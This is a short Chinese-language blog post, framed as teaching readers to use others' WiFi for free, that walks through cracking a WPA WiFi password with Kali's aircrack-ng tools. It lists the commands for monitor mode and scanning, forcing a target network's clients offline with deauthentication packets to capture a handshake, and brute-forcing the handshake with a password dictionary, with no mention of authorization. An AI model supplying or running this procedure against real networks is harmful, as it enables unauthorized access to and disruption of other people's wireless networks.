---
title: 使用Kali破解Wifi密码
date: 2022-01-05 15:29:33
tags: [Kali, 破解]
keywords: kali,wifi,破解
categories:
- kali
image: https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/kali.jpg
top: 0

---

教你用kali免费蹭网。

<!-- more -->



1、开启网卡监听模式

```
airmon-ng start wlan0
```

​	（关闭网卡监听模式）

```
airmon-ng stop wlan0
```



2、查看网卡是否成功开启监听模式

```
ifconfig		//wlan0后有mon即为开启成功，此时网卡处于监听模式
```



3、扫描wifi

```
airodump-ng wlan0mon		//扫描结束后ctrl+c结束进程
```



4、抓包

BSSID为wifi的MAC地址

PWR为信号强弱程度，数值越小信号越强

DATA为数据量，越大使用的人就越多

CH为信道频率（频道）

ESSID为wifi的名称

```
airodump-ng --bssid BSSID -c CH -w 抓包存储的路径 wlan0mon
//BSSID为wifi的MAC地址
//CH为信道频率
//路径后要加文件名
```



5、迫使对方连接的设备下线重连，便于抓包

在扫描wifi的同时新建一个终端：

```
aireplay-ng -0 0 STATION -a BSSID wlan0mon
//STATION为连接wifi的设备MAC地址
//BSSID为wifi的MAC地址
```

当扫描wifi的界面出现WPA handshake时表示抓包成功，这时停止扫描和发送数据



6、爆破解码

将密码字典和抓到的包放到同一目录便于操作，主要使用抓到的握手包（cap包）解码

```
aircrack-ng -w 密码字典路径 握手包路径
```

顺利的话能爆破出密码。